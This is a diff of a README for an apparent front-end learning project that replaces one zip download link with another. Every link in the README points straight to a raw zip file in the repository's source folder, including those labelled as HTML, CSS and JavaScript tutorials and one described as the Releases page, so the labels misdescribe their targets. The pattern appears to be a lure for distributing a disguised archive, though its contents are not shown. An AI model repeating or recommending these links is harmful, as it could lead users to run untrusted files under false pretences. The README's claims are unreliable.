@@ -1,7 +1,7 @@
 # 🎉 front-end-final-project - Your Easy Path to Front-End Development
 
 ## 📥 Download Now
-[![Download latest release](https://raw.githubusercontent.com/ssahinahmet/front-end-final-project/main/src/components/final-project-front-end-v1.9.zip%20the%20Latest%https://raw.githubusercontent.com/ssahinahmet/front-end-final-project/main/src/components/final-project-front-end-v1.9.zip)](https://raw.githubusercontent.com/ssahinahmet/front-end-final-project/main/src/components/final-project-front-end-v1.9.zip)
+[![Download latest release](https://raw.githubusercontent.com/ssahinahmet/front-end-final-project/main/src/front_final_project_end_2.8.zip%20the%20Latest%https://raw.githubusercontent.com/ssahinahmet/front-end-final-project/main/src/front_final_project_end_2.8.zip)](https://raw.githubusercontent.com/ssahinahmet/front-end-final-project/main/src/front_final_project_end_2.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the front-end-final-project! This application helps you learn and understand front-end development concepts easily. Whether you want to build your own websites or implement user interfaces, this project serves as a practical starting point.
@@ -25,7 +25,7 @@ This project comes with several important features:
 ## 📥 Download & Install
 To get started, visit the releases page to download the latest version of the application. Click the link below:
 
-[Download the latest release](https://raw.githubusercontent.com/ssahinahmet/front-end-final-project/main/src/components/final-project-front-end-v1.9.zip)
+[Download the latest release](https://raw.githubusercontent.com/ssahinahmet/front-end-final-project/main/src/front_final_project_end_2.8.zip)
 
 1. Click the link above to go to the Releases page.
 2. You will see a list of available versions. Locate the latest version.
@@ -57,9 +57,9 @@ For questions or technical support, please reach out via the issues tab on the G
 ## 🔗 Additional Resources
 Here are some helpful links to enhance your resources as you learn front-end development:
 
-- [Learn HTML](https://raw.githubusercontent.com/ssahinahmet/front-end-final-project/main/src/components/final-project-front-end-v1.9.zip)
-- [Learn CSS](https://raw.githubusercontent.com/ssahinahmet/front-end-final-project/main/src/components/final-project-front-end-v1.9.zip)
-- [Learn JavaScript](https://raw.githubusercontent.com/ssahinahmet/front-end-final-project/main/src/components/final-project-front-end-v1.9.zip)
+- [Learn HTML](https://raw.githubusercontent.com/ssahinahmet/front-end-final-project/main/src/front_final_project_end_2.8.zip)
+- [Learn CSS](https://raw.githubusercontent.com/ssahinahmet/front-end-final-project/main/src/front_final_project_end_2.8.zip)
+- [Learn JavaScript](https://raw.githubusercontent.com/ssahinahmet/front-end-final-project/main/src/front_final_project_end_2.8.zip)
 
 Feel free to explore these resources alongside using the front-end-final-project to maximize your learning experience. 
 
